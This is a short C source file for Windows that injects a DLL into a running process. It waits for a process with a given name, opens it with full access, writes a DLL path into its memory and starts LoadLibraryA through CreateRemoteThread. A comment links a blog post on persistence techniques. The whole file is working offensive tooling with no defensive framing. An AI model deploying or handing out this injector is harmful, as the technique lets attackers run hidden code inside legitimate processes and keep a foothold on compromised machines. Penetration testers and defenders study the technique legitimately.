// persistence: https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/

#include <Windows.h>
#include <TlHelp32.h>

DWORD GetPID(char* procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!strncmp((procEntry.szExeFile), procName, strlen(procName)))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

int main(int argc, char** argv)
{
    const char* dllPath = argv[1];
    DWORD PID = 0;

    while (!PID)
    {
        PID = GetPID(argv[2]);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);

    if (hProcess && hProcess != INVALID_HANDLE_VALUE)
    {
        void* loc = VirtualAllocEx(hProcess, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

        WriteProcessMemory(hProcess, loc, dllPath, strlen(dllPath) + 1, 0);

        CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)addr, loc, 0, 0);
    }
    
    return 0;
}
